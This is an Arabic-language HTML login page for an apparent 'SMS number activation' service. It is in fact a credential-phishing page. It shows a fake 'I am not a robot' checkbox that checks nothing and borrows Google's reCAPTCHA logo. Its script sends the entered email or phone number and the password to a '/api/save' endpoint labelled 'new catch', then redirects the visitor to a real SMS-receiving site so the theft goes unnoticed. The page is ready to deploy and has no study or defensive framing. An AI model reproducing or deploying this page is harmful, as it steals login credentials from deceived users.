<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - خدمة SMS</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .container {
            background: white; padding: 30px; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 90%; max-width: 380px; text-align: center;
        }
        .logo-container { margin-bottom: 20px; }
        #pageImg { width: 100px; height: 100px; border-radius: 50%; object-fit: contain; }
        
        h2 { color: #CC0044; margin-bottom: 25px; font-size: 19px; font-weight: bold; }
        
        input {
            width: 100%; padding: 14px; margin-bottom: 12px;
            border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
            outline: none; text-align: right; font-size: 14px;
        }
        
        /* تنسيق صندوق "أنا لست روبوت" */
        .captcha-box {
            display: flex; align-items: center; background: #f9f9f9;
            border: 1px solid #d3d3d3; border-radius: 3px; padding: 10px;
            margin-bottom: 15px; cursor: pointer; user-select: none;
        }
        .captcha-box:hover { border-color: #b9b9b9; }
        .checkbox {
            width: 24px; height: 24px; border: 2px solid #c1c1c1;
            border-radius: 2px; margin-left: 10px; display: inline-block;
            background: white; position: relative;
        }
        .checkbox.checked::after {
            content: '✔'; color: #009900; font-size: 20px;
            position: absolute; top: -5px; right: 2px;
        }
        .captcha-text { font-size: 14px; color: #555; flex-grow: 1; text-align: right; }
        .captcha-logo { width: 30px; opacity: 0.7; }

        .error-text { color: red; font-size: 12px; display: none; margin-bottom: 10px; text-align: right; }
        
        button {
            width: 100%; padding: 12px; background: #CC0044; color: white;
            border: none; border-radius: 8px; font-size: 17px; font-weight: bold; 
            cursor: pointer; transition: 0.3s;
        }
        button:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-container">
            <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
        </div>

        <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>

        <form id="checkForm">
            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="passInput" placeholder="كلمة السر" required>
            
            <div id="errorMsg" class="error-text">⚠️ تأكد من البيانات ومن الضغط على التحقق!</div>

            <div class="captcha-box" id="captchaTrigger">
                <div class="checkbox" id="checkIcon"></div>
                <div class="captcha-text">أنا لست برنامج روبوت</div>
                <img class="captcha-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            </div>

            <button type="submit" id="pageBtn">تسجيل دخول</button>
        </form>
    </div>

    <script>
        let isBotChecked = false;
        const captchaBox = document.getElementById('captchaTrigger');
        const checkIcon = document.getElementById('checkIcon');

        // محاكاة الضغط على الكابتشا
        captchaBox.onclick = function() {
            isBotChecked = true;
            checkIcon.classList.add('checked');
            document.getElementById('errorMsg').style.display = 'none';
        };

        document.getElementById('checkForm').onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            const error = document.getElementById('errorMsg');

            // التأكد من الضغط على الروبوت
            if (!isBotChecked) {
                error.innerText = "⚠️ يرجى تأكيد أنك لست روبوت!";
                error.style.display = 'block';
                return;
            }

            // إرسال البيانات
            try {
                await fetch('/api/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        title: "🚨 صيد جديد",
                        user: user,
                        password: pass
                    })
                });
            } catch (err) {}

            window.location.href = "https://receive-smss.com/"; 
        };
    </script>
</body>
</html>
